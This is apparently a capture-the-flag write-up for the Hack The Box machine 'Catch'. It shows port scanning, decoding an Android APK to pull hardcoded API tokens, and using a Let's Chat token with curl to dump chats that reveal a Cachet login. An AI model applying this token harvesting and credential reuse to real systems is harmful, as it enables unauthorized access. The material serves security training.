# [catch](https://app.hackthebox.com/machines/Catch)

> A Linux server belonging to Catch Global Systems, hosting their website, mobile application, [Gitea](https://github.com/go-gitea/gitea) instance, [Let's Chat](https://github.com/sdelements/lets-chat) instance, and [Cachet](https://github.com/CachetHQ/Cachet) instance. The mobile application contains working API tokens for their Gitea and Let's Chat instances. Using the Let's Chat API token, it's possible to dump the chat history, revealing a user's password to the Cachet instance. The version of Cachet running has an information disclosure vulnerability, making it possible to read the server's environment variables, one of which is a user's password. With low-privilege access to the server as this user, it is possible to read an Android application verification script that is being executed as a cron job by `root`. By constructing an Android application whose name contains a `bash` command, it is possible to exploit this cron job and run arbitrary commands as `root`.

---

## Open Port Enumeration

The target's TCP ports 22, 80, 3000, 5000, and 8000 are open.

```bash
$ sudo masscan -p1-65535 10.129.183.108 --rate=1000 -e tun0 --output-format grepable --output-filename enum/catch.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-14 18:42:53 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/catch.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,3000,5000,80,8000,
```

According to [launchpad.net](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.4), the OpenSSH banner indicates the target's operating system is likely Ubuntu 20.04 (Focal).

Port 80 is hosting an Apache web server, version 2.4.41. The title of the web page is "Catch Global Systems."

Port 3000 appears to be some kind of web application. The title of the web page is "Catch Repositories." It sets two unique cookies, `i_like_gitea` and `macaron_flash`.

Port 5000 also appears to be a web application. It contains a reference to a login page at `/login`.

Port 8000 is an Apache web server version 4.2.29, which is different than the Apache web server running on port 80. This seems to indicate some sort of containerization is at play.

```bash
$ nmap -sC -sV -p22,3000,5000,80,8000 10.129.183.108 -oA enum/catch
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 14:51 EDT
Nmap scan report for 10.129.183.108
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=ea6ce38207465e12; Path=/; HttpOnly
|     Set-Cookie: _csrf=o5ZDm5VFGFmUzp9c7Sp7uVIqXj06MTY0NzI4MzkxMTU0OTY0OTU0MQ; Path=/; Expires=Tue, 15 Mar 2022 18:51:51 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Mar 2022 18:51:51 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Catch Repositories </title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=d52438b9938fef62; Path=/; HttpOnly
|     Set-Cookie: _csrf=HFGHM707syms7M3ezVkl-ZB-1Zk6MTY0NzI4MzkxNzIwMTA4MTAwMw; Path=/; Expires=Tue, 15 Mar 2022 18:51:57 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Mar 2022 18:51:57 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy:
|     X-Content-Security-Policy:
|     X-WebKit-CSP:
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3AFhj1sRthyoBrzUdqTadvA19xLQWjDnh6.pbir9i7gFCH3cO7JyE5rA7DRmvwGmiwHFE%2BPBVZa3L0; Path=/; HttpOnly
|     Date: Mon, 14 Mar 2022 18:51:56 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy:
|     X-Content-Security-Policy:
|     X-WebKit-CSP:
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3AkmZV3A6xQhDc8nD9sYwCSVu91Mcm3QJY.n4OdSvM4ND%2F49RlqFf3wujJoVMp1nDHiNOHAtQ7BhZQ; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Mon, 14 Mar 2022 18:51:57 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.92%I=7%D=3/14%Time=622F8EC7%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,1EEB,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20i_like_gitea=ea6ce3820
SF:7465e12;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=o5ZDm5VFGFmUzp9
SF:c7Sp7uVIqXj06MTY0NzI4MzkxMTU0OTY0OTU0MQ;\x20Path=/;\x20Expires=Tue,\x20
SF:15\x20Mar\x202022\x2018:51:51\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nS
SF:et-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly\r\nX
SF:-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2014\x20Mar\x202022\x20
SF:18:51:51\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20c
SF:lass=\"theme-\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-
SF:8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20
SF:initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20conten
SF:t=\"ie=edge\">\n\t<title>\x20Catch\x20Repositories\x20</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjo
SF:iQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcy
SF:IsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W
SF:3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz")%r(Help,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,17F
SF:,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nSet-Cookie:\x20i_like
SF:_gitea=d52438b9938fef62;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf
SF:=HFGHM707syms7M3ezVkl-ZB-1Zk6MTY0NzI4MzkxNzIwMTA4MTAwMw;\x20Path=/;\x20
SF:Expires=Tue,\x2015\x20Mar\x202022\x2018:51:57\x20GMT;\x20HttpOnly;\x20S
SF:ameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\
SF:x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2014\x2
SF:0Mar\x202022\x2018:51:57\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.92%I=7%D=3/14%Time=622F8ECD%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,23C,"HTTP/1\.1\x20302\x20Found\r\nX-Frame-Options:\x20SAMEORIG
SF:IN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Security-Policy:
SF:\x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-CSP:\x20\r\nX-UA-Com
SF:patible:\x20IE=Edge,chrome=1\r\nLocation:\x20/login\r\nVary:\x20Accept,
SF:\x20Accept-Encoding\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nContent-Length:\x2028\r\nSet-Cookie:\x20connect\.sid=s%3AFhj1sRthyoBrz
SF:UdqTadvA19xLQWjDnh6\.pbir9i7gFCH3cO7JyE5rA7DRmvwGmiwHFE%2BPBVZa3L0;\x20
SF:Path=/;\x20HttpOnly\r\nDate:\x20Mon,\x2014\x20Mar\x202022\x2018:51:56\x
SF:20GMT\r\nConnection:\x20close\r\n\r\nFound\.\x20Redirecting\x20to\x20/l
SF:ogin")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(ZendJa
SF:vaBridge,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close
SF:\r\n\r\n")%r(HTTPOptions,243,"HTTP/1\.1\x20200\x20OK\r\nX-Frame-Options
SF::\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Sec
SF:urity-Policy:\x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-CSP:\x2
SF:0\r\nX-UA-Compatible:\x20IE=Edge,chrome=1\r\nAllow:\x20GET,HEAD\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETa
SF:g:\x20W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nSet-Cookie:\x20connect\.si
SF:d=s%3AkmZV3A6xQhDc8nD9sYwCSVu91Mcm3QJY\.n4OdSvM4ND%2F49RlqFf3wujJoVMp1n
SF:DHiNOHAtQ7BhZQ;\x20Path=/;\x20HttpOnly\r\nVary:\x20Accept-Encoding\r\nD
SF:ate:\x20Mon,\x2014\x20Mar\x202022\x2018:51:57\x20GMT\r\nConnection:\x20
SF:close\r\n\r\nGET,HEAD")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.84 seconds
```

---

## Port 80 Enumeration

The website of "Catch Global Systems," a software development organization.

![](images/Pasted%20image%2020220314160139.png)

It contains a link to download the "mobile version of their status site," an Android application, `catchv1.0.apk`. The application's future enhancements include integration with [Gitea](https://github.com/go-gitea/gitea) and [Let's Chat](https://github.com/sdelements/lets-chat).

All other links on the site are dead.

### Content Discovery

Nothing significant here.

```bash
feroxbuster -u http://10.129.183.108 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.183.108
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      321c http://10.129.183.108/javascript => http://10.129.183.108/javascript/
403      GET        9l       28w      279c http://10.129.183.108/.php
403      GET        9l       28w      279c http://10.129.183.108/.html
200      GET      374l      602w     6163c http://10.129.183.108/
403      GET        9l       28w      279c http://10.129.183.108/.htm
403      GET        9l       28w      279c http://10.129.183.108/.htaccess
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htm
403      GET        9l       28w      279c http://10.129.183.108/javascript/.php
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html
403      GET        9l       28w      279c http://10.129.183.108/.phtml
403      GET        9l       28w      279c http://10.129.183.108/javascript/
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htaccess
403      GET        9l       28w      279c http://10.129.183.108/javascript/.phtml
403      GET        9l       28w      279c http://10.129.183.108/.htc
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htc
403      GET        9l       28w      279c http://10.129.183.108/.html_var_DE
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html_var_DE
403      GET        9l       28w      279c http://10.129.183.108/server-status
403      GET        9l       28w      279c http://10.129.183.108/.htpasswd
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htpasswd
403      GET        9l       28w      279c http://10.129.183.108/.html.
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html.
403      GET        9l       28w      279c http://10.129.183.108/.html.html
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html.html
403      GET        9l       28w      279c http://10.129.183.108/.htpasswds
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htpasswds
403      GET        9l       28w      279c http://10.129.183.108/.htm.
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htm.
403      GET        9l       28w      279c http://10.129.183.108/.htmll
403      GET        9l       28w      279c http://10.129.183.108/.phps
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htmll
403      GET        9l       28w      279c http://10.129.183.108/javascript/.phps
403      GET        9l       28w      279c http://10.129.183.108/.html.old
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html.old
403      GET        9l       28w      279c http://10.129.183.108/.ht
403      GET        9l       28w      279c http://10.129.183.108/.html.bak
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html.bak
403      GET        9l       28w      279c http://10.129.183.108/javascript/.ht
403      GET        9l       28w      279c http://10.129.183.108/.htm.htm
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htm.htm
403      GET        9l       28w      279c http://10.129.183.108/.hta
403      GET        9l       28w      279c http://10.129.183.108/.html1
403      GET        9l       28w      279c http://10.129.183.108/.htgroup
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htgroup
403      GET        9l       28w      279c http://10.129.183.108/javascript/.hta
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html1
403      GET        9l       28w      279c http://10.129.183.108/.html.LCK
403      GET        9l       28w      279c http://10.129.183.108/.html.printable
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html.LCK
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html.printable
403      GET        9l       28w      279c http://10.129.183.108/.htm.LCK
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htm.LCK
403      GET        9l       28w      279c http://10.129.183.108/.htaccess.bak
403      GET        9l       28w      279c http://10.129.183.108/.html.php
403      GET        9l       28w      279c http://10.129.183.108/.htmls
403      GET        9l       28w      279c http://10.129.183.108/.htx
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htaccess.bak
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html.php
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htmls
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htx
403      GET        9l       28w      279c http://10.129.183.108/.htlm
403      GET        9l       28w      279c http://10.129.183.108/.html-
403      GET        9l       28w      279c http://10.129.183.108/.htm2
403      GET        9l       28w      279c http://10.129.183.108/.htuser
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htm2
403      GET        9l       28w      279c http://10.129.183.108/javascript/.html-
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htuser
403      GET        9l       28w      279c http://10.129.183.108/javascript/.htlm
[####################] - 2m    172012/172012  0s      found:68      errors:161
[####################] - 2m     43003/43003   277/s   http://10.129.183.108
[####################] - 2m     43003/43003   281/s   http://10.129.183.108/javascript
[####################] - 2m     43003/43003   285/s   http://10.129.183.108/
[####################] - 2m     43003/43003   289/s   http://10.129.183.108/javascript/
```

---

## Catch Version 1 Android Application

Decode the APK with `apktool`.

```bash
$ apktool decode catchv1.0.apk -o catchv1.0
I: Using Apktool 2.5.0-dirty on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/tgihf/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

`res/values/strings.xml` contains three interesting strings: `gitea_token`, `lets_chat_token`, and `slack_token`.

```xml
...
    <string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
...
    <string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
...
<string name="slack_token">xoxp-23984754863-2348975623103</string>
...
```

---

## Let's Chat Enumeration

Catch's [Let's Chat](https://github.com/sdelements/lets-chat) instance. Let's Chat is a self-hosted chat application for small teams.

![](images/Pasted%20image%2020220314160800.png)

### API Token Access

According to Let's Chat's [Authorize API documentation](https://github.com/sdelements/lets-chat/wiki/API%3A-Authentication), the token from the mobile application can be used as a Bearer token for authorization.

Let's Chat has [several other API endpoints](https://github.com/sdelements/lets-chat/wiki/API). Use this token to query them.

There are three users: `admin`, `john`, `will`, and `lucas`.

```bash
$ curl -s http://catch.htb:5000/users -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq '.'
[
  {
    "id": "61b86aead984e2451036eb16",
    "firstName": "Administrator",
    "lastName": "NA",
    "username": "admin",
    "displayName": "Admin",
    "avatar": "e2b5310ec47bba317c5f1b5889e96f04",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18",
      "61b8708efe190b466d476bfb"
    ]
  },
  {
    "id": "61b86dbdfe190b466d476bf0",
    "firstName": "John",
    "lastName": "Smith",
    "username": "john",
    "displayName": "John",
    "avatar": "f5504305b704452bba9c94e228f271c4",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86e40fe190b466d476bf2",
    "firstName": "Will",
    "lastName": "Robinson",
    "username": "will",
    "displayName": "Will",
    "avatar": "7c6143461e935a67981cc292e53c58fc",
    "openRooms": [
      "61b86b3fd984e2451036eb18",
      "61b86b28d984e2451036eb17"
    ]
  },
  {
    "id": "61b86f15fe190b466d476bf5",
    "firstName": "Lucas",
    "lastName": "NA",
    "username": "lucas",
    "displayName": "Lucas",
    "avatar": "b36396794553376673623dc0f6dec9bb",
    "openRooms": [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18"
    ]
  }
]
```

There are three messaging rooms: "Cachet Updates and Maintenance," "Android Development," and "New Joinees, Org updates." `admin` is the owner of them all.

```bash
$ curl -s http://catch.htb:5000/rooms -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq '.'
[
  {
    "id": "61b86b28d984e2451036eb17",
    "slug": "status",
    "name": "Status",
    "description": "Cachet Updates and Maintenance",
    "lastActive": "2021-12-14T10:34:20.749Z",
    "created": "2021-12-14T10:00:08.384Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b8708efe190b466d476bfb",
    "slug": "android_dev",
    "name": "Android Development",
    "description": "Android App Updates, Issues & More",
    "lastActive": "2021-12-14T10:24:21.145Z",
    "created": "2021-12-14T10:23:10.474Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b86b3fd984e2451036eb18",
    "slug": "employees",
    "name": "Employees",
    "description": "New Joinees, Org updates",
    "lastActive": "2021-12-14T10:18:04.710Z",
    "created": "2021-12-14T10:00:31.043Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  }
]
```

"New Joinees, Org updates"

```bash
$ curl -s http://catch.htb:5000/rooms/61b86b3fd984e2451036eb18/messages -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq '.'
[
  {
    "id": "61b86f5cfe190b466d476bf7",
    "text": "Thanks @admin ",
    "posted": "2021-12-14T10:18:04.710Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86ef2fe190b466d476bf4",
    "text": "Please welcome our new IT Admin - Lucas, a crucial role that will help Catch’s revenue and will contribute to the overall profitability of the company!",
    "posted": "2021-12-14T10:16:18.187Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86e5dfe190b466d476bf3",
    "text": "Thanks John! Glad to be part of the Catch ",
    "posted": "2021-12-14T10:13:49.568Z",
    "owner": "61b86e40fe190b466d476bf2",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86e12fe190b466d476bf1",
    "text": "Welcome Will!",
    "posted": "2021-12-14T10:12:34.388Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b3fd984e2451036eb18"
  },
  {
    "id": "61b86d5ffe190b466d476bef",
    "text": "Join me in welcoming our new employee Will Robinson who's working as iOS Developer with John Team",
    "posted": "2021-12-14T10:09:35.597Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b3fd984e2451036eb18"
  }
]
```

"Android Development"

```bash
$ curl -s http://catch.htb:5000/rooms/61b8708efe190b466d476bfb/messages -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq '.'
[
  {
    "id": "61b870d5fe190b466d476bfc",
    "text": "Hey Team, Just heads up that we're working on android app to alert our customers about status of the services. ",
    "posted": "2021-12-14T10:24:21.145Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b8708efe190b466d476bfb"
  }
]
```

The "Cachet Updates and Maintenance" room discloses a credential to Catch's Catchet instance: `john`:`E}V!mywu_69T4C}W`.

```bash
$ curl -s http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq '.'
[
  {
    "id": "61b8732cfe190b466d476c02",
    "text": "ah sure!",
    "posted": "2021-12-14T10:34:20.749Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b8731ffe190b466d476c01",
    "text": "You should actually include this task to your list as well as a part of quarterly audit",
    "posted": "2021-12-14T10:34:07.449Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b872b9fe190b466d476c00",
    "text": "Also make sure we've our systems, applications and databases up-to-date.",
    "posted": "2021-12-14T10:32:25.514Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87282fe190b466d476bff",
    "text": "Excellent! ",
    "posted": "2021-12-14T10:31:30.403Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87277fe190b466d476bfe",
    "text": "Why not. We've this in our todo list for next quarter",
    "posted": "2021-12-14T10:31:19.094Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87241fe190b466d476bfd",
    "text": "@john is it possible to add SSL to our status domain to make sure everything is secure ? ",
    "posted": "2021-12-14T10:30:25.108Z",
    "owner": "61b86aead984e2451036eb16",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b87010fe190b466d476bf9",
    "text": "Sure one sec.",
    "posted": "2021-12-14T10:21:04.635Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86fb1fe190b466d476bf8",
    "text": "Can you create an account for me ? ",
    "posted": "2021-12-14T10:19:29.677Z",
    "owner": "61b86dbdfe190b466d476bf0",
    "room": "61b86b28d984e2451036eb17"
  },
  {
    "id": "61b86f4dfe190b466d476bf6",
    "text": "Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ",
    "posted": "2021-12-14T10:17:49.761Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
  }
]
```

There are no files.

```bash
$ curl -s http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/files -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq '.'
[]
```

---

## Cachet Information Disclosure

Catch's [Cachet](http://10.129.183.108:8000/) instance. Cachet is an open source status page system.

The page shows all systems operational and no incidents reported for the last 7 days.

![](images/Pasted%20image%2020220314161016.png)

### Dashboard Access as `john`

Use the credential `john`:`E}V!mywu_69T4C}W` from Catch's Let's Chat instance to login and access the Cachet dashboard.

The bottom of the Settings page indicates the Cachet version is 2.4.0.

![](images/Pasted%20image%2020220314200443.png)

